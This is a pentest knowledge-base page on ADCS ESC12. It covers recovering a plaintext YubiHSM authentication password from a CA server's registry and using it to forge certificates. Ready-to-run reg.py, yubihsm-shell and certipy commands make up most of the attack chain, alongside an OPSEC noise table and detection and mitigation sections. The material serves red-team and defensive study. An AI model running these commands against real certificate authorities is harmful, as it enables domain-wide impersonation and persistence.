---
title: "ESC12 — Shell Access to CA with YubiHSM"
description: "ESC12 was disclosed by Hans-Joachim Knobloch and targets Certificate Authorities that use a Yubico YubiHSM2 hardware device for protecting their CA…"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Impacket", "Certipy", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC12 — Shell Access to CA with YubiHSM.md"
---
# ESC12 — Shell Access to CA with YubiHSM

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Post-Exploitation / HSM Bypass |
| **Difficulty** | High (requires CA server shell access) |
| **Pre-requisites** | Local admin / SYSTEM on CA server using YubiHSM2 |
| **Tools** | Registry access, certutil, YubiHSM tools |
| **OPSEC Noise** | Medium — registry access + cert operations |
| **One-liner** | Recover plaintext YubiHSM authentication password from the registry on a CA server, then use it to sign arbitrary certificates through the HSM — bypassing the "HSMs prevent key extraction" assumption. |

***

## What Is ESC12?

ESC12 was disclosed by **Hans-Joachim Knobloch** and targets Certificate Authorities that use a **Yubico YubiHSM2** hardware device for protecting their CA signing key. The conventional wisdom is that HSMs make the Golden Certificate attack (DPERSIST1) impossible because the private key cannot be extracted. ESC12 **breaks this assumption** — not by extracting the key, but by **recovering the HSM authentication password and using it to sign certificates through the HSM itself**.

The vulnerability: Yubico's YubiHSM Key Storage Provider (KSP) stores the authentication password needed to unlock the HSM in **plaintext in the Windows Registry**:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword
```

With this password, you don't need to extract the private key — you can instruct the HSM to sign certificates directly, achieving the same result as having the raw key material.

***

## ESC12 vs Golden Certificate (DPERSIST1)

| | Golden Certificate (DPERSIST1) | ESC12 |
|---|---|---|
| **CA key protection** | Software-protected (DPAPI) | **HSM-protected (YubiHSM2)** |
| **Key extraction** | ✅ Key is extracted | ❌ Key stays in HSM |
| **How cert is signed** | Offline with extracted key | **Through the HSM using recovered password** |
| **Offline forging** | ✅ Anytime, anywhere | ❌ Must have HSM access (or be on the CA server) |
| **Pre-requisite** | Local admin on CA | Local admin on CA + YubiHSM connected |
| **Recovery difficulty** | Rebuild CA | Rotate HSM auth key + rebuild CA |

> ⚠️ The critical difference: DPERSIST1 gives you **offline forging forever** (you take the key with you). ESC12 gives you **online forging** — you need access to the HSM device (or the CA server where it's connected) each time you want to sign a cert.

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| Local admin / SYSTEM on the CA server | Post-exploitation — you've already compromised the domain |
| CA uses YubiHSM2 for key storage | Check Key Storage Provider configuration |
| YubiHSM auth password stored in registry | Default YubiHSM KSP configuration — almost always the case |
| YubiHSM device physically connected | USB device must be attached to the CA server |

***

## Step 0 — Confirm CA Uses YubiHSM

```powershell
# On the CA server — check the Key Storage Provider
certutil -getkey <CA-Name>

# Look for output mentioning YubiHSM:
# Provider = Yubico YubiHSM Key Storage Provider

# Or check registry
reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>" /v CSPProvider
# If result = "Yubico YubiHSM Key Storage Provider" → ESC12 is potentially exploitable
```

```bash
# From Linux with admin access (via Impacket)
reg.py 'domain/administrator:Password123!'@<CA-IP> query \
  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>' \
  -v CSPProvider
```

***

## Full Attack Chain

### Step 1 — Recover the YubiHSM Authentication Password

```powershell
# On the CA server
reg query "HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword"

# Expected output:
# AuthKeysetPassword    REG_SZ    password123
#                                 ↑ Plaintext HSM password
```

```bash
# From Linux via Impacket
reg.py 'domain/administrator:Password123!'@<CA-IP> query \
  -keyName 'HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword'
```

### Step 2 — Connect to YubiHSM and Sign Certificates

With the authentication password, you can now use the YubiHSM KSP to sign certificates. This is typically done **on the CA server itself** since the HSM is physically connected there.

```powershell
# Option A: Use certutil directly on the CA server to issue certs
# The CA service already has access to the HSM — you just need admin on the server
certutil -config "CA-SERVER\DOMAIN-CA" -submit cert_request.req

# Option B: Use the YubiHSM Shell tool with the recovered password
yubihsm-shell.exe
> connect
> session open 1 <recovered_password>
> sign pkcs11 <key_id> <certificate_data>
```

### Step 3 — Forge a Certificate (via CA Service)

If you have admin access on the CA server, the simplest approach is to use the CA's own infrastructure:

```bash
# From Linux — use certipy backup (will attempt to use the KSP)
certipy-ad backup \
  -u 'administrator@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET \
  -target <CA-IP>

# If certipy backup fails (HSM blocks key export), 
# use certipy req directly with admin access to request certs for any user
certipy-ad req \
  -u 'administrator@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -upn 'administrator@domain.htb'
```

### Step 4 — Authenticate

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET
```

***

## When ESC12 Matters

ESC12 is only relevant in environments where:
1. The CA uses a YubiHSM2 (or similar HSM with KSP password in registry)
2. You've already achieved domain admin (this is a post-exploitation / persistence technique)
3. The standard Golden Certificate (DPERSIST1) `certipy backup` fails because the key is HSM-protected

If `certipy backup` succeeds, you don't need ESC12 — you already have the key. ESC12 is the **fallback when HSMs are in play**.

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Registry read (auth password) | Security Event 4663 (if registry auditing enabled) | 🟡 Medium |
| Certificate issuance via CA service | Event ID 4886/4887 on CA | 🟡 Medium |
| YubiHSM shell connection | YubiHSM audit log (if configured) | 🟡 Medium |

***

## Detection Indicators

- **YubiHSM audit logs** — Unusual signing operations or session openings
- **Event ID 4663** — Registry access to `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`
- **Event ID 4887** — Certificate issued for high-privilege accounts outside normal business hours
- **Process monitoring** — `yubihsm-shell.exe` execution by unexpected accounts

***

## Mitigation

- **Do NOT store HSM auth password in plaintext in the registry** — Use Yubico's alternative secure authentication methods (wrap keys, multi-auth)
- **Harden CA server access** — Tier 0 asset, restrict all administrative access
- **Enable registry auditing** on `HKLM\SOFTWARE\Yubico` — alert on any read access
- **Rotate HSM authentication keys** regularly
- **Consider HSMs with FIPS 140-2 Level 3+** — physically tamper-evident, stronger auth requirements
- **Monitor YubiHSM connector logs** — alert on unexpected sessions
